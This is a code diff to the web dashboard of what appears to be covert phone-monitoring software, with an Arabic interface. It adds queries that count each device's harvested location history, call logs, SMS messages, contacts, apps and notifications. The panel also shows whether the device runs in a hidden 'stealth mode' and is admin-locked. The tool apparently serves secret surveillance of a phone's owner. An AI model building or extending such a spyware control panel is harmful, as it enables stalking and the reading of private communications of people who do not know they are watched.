@@ -387,6 +387,26 @@ async function renderTab(tab) {
 
 async function renderOverview(el) {
   const d = selectedDevice;
+  const serial = d.device_serial;
+  const [locData, callData, smsData, contactData, appData, notifData, stateData] = await Promise.all([
+    sb.from('location_history').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
+    sb.from('call_logs').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
+    sb.from('sms_messages').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
+    sb.from('contacts').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
+    sb.from('installed_applications').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
+    sb.from('notification_logs').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
+    sb.from('device_state_snapshots').select('captured_at').eq('device_serial', serial).order('captured_at', { ascending: false }).limit(1).maybeSingle()
+  ]);
+
+  const counts = {
+    location: locData.count || 0,
+    calls: callData.count || 0,
+    sms: smsData.count || 0,
+    contacts: contactData.count || 0,
+    apps: appData.count || 0,
+    notifications: notifData.count || 0
+  };
+
   el.innerHTML = `
     <!-- Quick Actions -->
     <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
@@ -398,26 +418,37 @@ async function renderOverview(el) {
         ? `<button class="btn btn-sm btn-primary" onclick="restoreDevice('${d.device_serial}')" style="width:auto;background:#22c55e">↩ استعادة</button>`
         : `<button class="btn btn-sm btn-danger" onclick="deleteDevice('${d.device_serial}')" style="width:auto">🗑 حذف</button>`}
     </div>
-    <!-- Stats -->
+    <!-- Device Status -->
     <div class="grid-4">
       <div class="card"><div class="card-header"><h3>الحالة</h3></div>
-        <div class="card-value" style="color:${d.is_active ? '#22c55e' : '#ef4444'};font-size:20px">${d.is_active ? 'نشط' : 'موقف'}</div>
-        <div class="card-sub">${d.is_stealth ? 'وضع مخفي' : 'ظاهر'}</div>
+        <div class="card-value" style="color:${d.is_active ? '#22c55e' : '#ef4444'};font-size:20px">${d.is_active ? '🟢 نشط' : '🔴 موقف'}</div>
+        <div class="card-sub">${d.is_stealth ? '🕵️ وضع مخفي' : '👁️ ظاهر'}</div>
       </div>
       <div class="card"><div class="card-header"><h3>آخر ظهور</h3></div>
         <div class="card-value" style="font-size:16px">${d.last_seen_at ? new Date(d.last_seen_at).toLocaleString('ar-SA') : '—'}</div>
       </div>
       <div class="card"><div class="card-header"><h3>الجهاز</h3></div>
-        <div style="font-size:14px;line-height:1.8">${d.manufacturer || '—'} ${d.model || ''}<br>${d.os_version || ''}<br>${d.phone_number || '—'}</div>
+        <div style="font-size:14px;line-height:1.8">${d.manufacturer || '—'} ${d.model || ''}<br>${d.os_version || ''}</div>
       </div>
-      <div class="card"><div class="card-header"><h3>سريع</h3></div>
+      <div class="card"><div class="card-header"><h3>البيانات</h3></div>
         <div style="font-size:13px;line-height:2">
-          📍 <a href="#" onclick="switchTab('location');return false" style="color:#3b82f6">الموقع</a><br>
-          📞 <a href="#" onclick="switchTab('calls');return false" style="color:#3b82f6">المكالمات</a><br>
-          💬 <a href="#" onclick="switchTab('sms');return false" style="color:#3b82f6">الرسائل</a>
+          📍 ${counts.location} موقع · 📞 ${counts.calls} مكالمة<br>
+          💬 ${counts.sms} رسالة · 👤 ${counts.contacts} اتصال<br>
+          📱 ${counts.apps} تطبيق · 🔔 ${counts.notifications} إشعار
         </div>
       </div>
     </div>
+    <!-- Quick Links -->
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
+      <button class="btn btn-sm btn-outline" onclick="switchTab('location')" style="width:auto">📍 الموقع</button>
+      <button class="btn btn-sm btn-outline" onclick="switchTab('calls')" style="width:auto">📞 المكالمات</button>
+      <button class="btn btn-sm btn-outline" onclick="switchTab('sms')" style="width:auto">💬 الرسائل</button>
+      <button class="btn btn-sm btn-outline" onclick="switchTab('contacts')" style="width:auto">👤 جهات الاتصال</button>
+      <button class="btn btn-sm btn-outline" onclick="switchTab('apps')" style="width:auto">📱 التطبيقات</button>
+      <button class="btn btn-sm btn-outline" onclick="switchTab('notifications')" style="width:auto">🔔 الإشعارات</button>
+      <button class="btn btn-sm btn-outline" onclick="switchTab('state')" style="width:auto">🔋 حالة الجهاز</button>
+    </div>
+    <div id="cmdResult"></div>
     <!-- Device Info -->
     <div class="card"><div class="card-header"><h3>معلومات الجهاز</h3></div>
       <table class="data-table">
@@ -431,8 +462,7 @@ async function renderOverview(el) {
         <tr><td>تاريخ التسجيل</td><td>${d.enrolled_at ? new Date(d.enrolled_at).toLocaleString('ar-SA') : '—'}</td></tr>
         <tr><td>Admin Lock</td><td>${d.is_admin_locked ? '🔒 نعم' : '🔓 لا'}</td></tr>
       </table>
-    </div>
-    <div id="cmdResult"></div>`;
+    </div>`;
 }
 
 async function renderLocation(el) {
